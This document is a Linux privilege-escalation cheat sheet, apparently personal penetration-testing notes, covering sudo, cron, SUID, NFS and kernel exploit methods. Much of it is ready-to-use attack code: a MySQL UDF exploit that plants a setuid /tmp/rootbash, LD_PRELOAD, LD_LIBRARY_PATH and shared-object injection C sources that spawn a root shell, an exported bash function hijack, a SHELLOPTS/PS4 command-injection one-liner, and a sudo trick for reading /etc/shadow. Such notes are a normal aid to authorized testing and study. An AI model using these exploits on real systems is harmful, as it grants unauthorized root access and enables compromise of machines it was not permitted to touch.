# Linux Privilege Escalation

## Strategy

- Spend time reading results
- Make note of interesting script findings
- Make checklists for what methods needs in order to work
- Check files in home directories and other common locations
- Check history files
- Try easy methods first (sudo, cron, SUID)
- Check root processes and enumerate versions and possible public exploits
- Check internal ports for forwarding
- Re-read fulle enumeration dumps and highlight anything odd
- Unfamiliar files/processes or unusual filesystems
- Think about kernel exploits

1. Check current user
2. Run Linux Smart Enumeration with increasing levels
3. Run other scripts
4. Run manual commands from other cheatsheets

## Service Exploits

- Look for known exploits for services running as root

```bash
# Find procs running as root
ps aux | grep "^root"

# Find version
$PROGRAM -v
$PROGRAM --version
dpkg -l | grep $PROGRAM
rpm -qa | grep $PROGRAM

# MySQL UDF exploit

# Add -fPIC on x64 systems
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
mysql> \! sh
```

## Weak File Permissions

- Try to access files containing sensitive information to gain elevated access
- Passwords or SSH keys
- If file is writable we can alter OS system function
- Shadow and passwd files
- Backups in /, /tmp and /var/backups

```bash
# Generate new password hash
# For shadow file
mkpasswd -m sha-512 newpassword
# For passwd file
openssl passwd "password"
```

## Sudo

- Run command as other user
- Config in /etc/sudoers
- Try to read files owned by root
- Write to files (shadow, ssh)
- https://gtfobins.github.io/
- Check if `env_keep` option is set
- LD_PRELOAD
  - Can be set to path of .so file
  - Will be loaded before all others
  - Custom shared object with init() function to execute code when object is loaded
  - RUID must match EUID
  - Sudo must be configured to keep LD_PRELOAD variable with env_keep
- LD_LIBRARY_PATH
  - Contains set of dirs where program looks for shared libraries
  - Check with `ldd /usr/sbin/apache2`
  - Create shared library with same name and set LD_LIBRARY_PATH to parent directory


```bash
sudo -s
sudo -i
sudo /bin/bash
sudo passwd

# Read first line of file with apache2
sudo apache2 -f /etc/shadow
```

```c
// LD_PRELOAD privesc
// Compile with: gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
// Run sudo command with: sudo LD_PRELOAD=/tmp/preload.so find
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

```c
// LD_LIBRARY_PATH
// Compile with: gcc -o libcrypt.so.1 -shared -fPIC library_path.c
// Rnu sudo with: sudo LD_LIBRARY_PATH=. apache2
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

## Cron Jobs

- Scheduled to run at certain time
- Usually in /var/spool/cron or /var/spool/cron/crontabs
- Systemwide crontab at /etc/crontab
- crontab PATH
  - set to /usr/bin:/bin by default
  - can be overwritten
  - If script does not use absolute path and directory in PATH variable is writable we can create script with same name as cron job
- Wildcards
  - Pass command line options through filenames

## SUID / SGID

- Shell escapes with gtfobins
- Look for known exploits for installed services
- Shared object injection
  - use `strace` to track syscalls and check if any .so files were not found
  - If location is writable we can craft malicious .so file and spawn shell
- Check if program uses relative paths
  - Use strings, strace or ltrace
- If bash version < 4.2-048
  - create user functions with absolute path name
  - can be exported to processes have access to them
  - take precedence over actual executable
- Bash debugging mode if bash version < 4.4
  - enable with -x or modifying SHELLOPTS env var to include xtrace
  - SHELLOPTS read only by default but env command allows SHELLOPTS to be set
  - In debug mode bash uses PS4 env var to display extra prompt
  - Can include embedded command
  - If SUID file runs another program via bash with system() env variables can be inherited

```bash
# SUID files
find / -type f -perm -u=s -exec ls -l {} \; 2>/dev/null

# SGID files
find / -type f -perm -g=s -exec ls -l {} \; 2>/dev/null

# SUID and SGID
find / -type f \( -perm -u=s -o -perm -g=s \) -exec ls -l {} \; 2>/dev/null

# Check for missing .so files
strace /usr/bin/suid 2>&1 | grep -iE "open|access|no such file"

# strace against command
strace -v -f -e execve /usr/bin/suid 2>&1 | grep exec

# ltrace against command
ltrace /usr/bin/suid

# Create user function and export it
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# Bash debugging mode exploit
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/bin/suid
```

```c
// Shared object injection
// Compile with: gcc -shared -fPIC -o libcalc.so libcalc.c

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
```

## Passwords & Keys

- Weak password storage
- Password reuse
- Passwords for services in plaintext config files
- History files for cleartext passwords

## NFS

- NFS shares configured in /etc/exports files
- Created files inherit remote users UID and GID even if they don't exist on the NFS server
- If no_root_squash NFS config option is set we can mount share as root and create file as local root user

```bash
# Show mounts
showmount -e <target>
nmap -sV --script=nfs-showmount <target>

# Mount share
mount -o rw,vers=2 <target>:<share> <local_directory>
```

## Kernel Exploits

- Last resort
- Use linux-exploit-suggester 2

1. Enumerate kernel & OS version
2. Find matching exploits
3. Compile and run
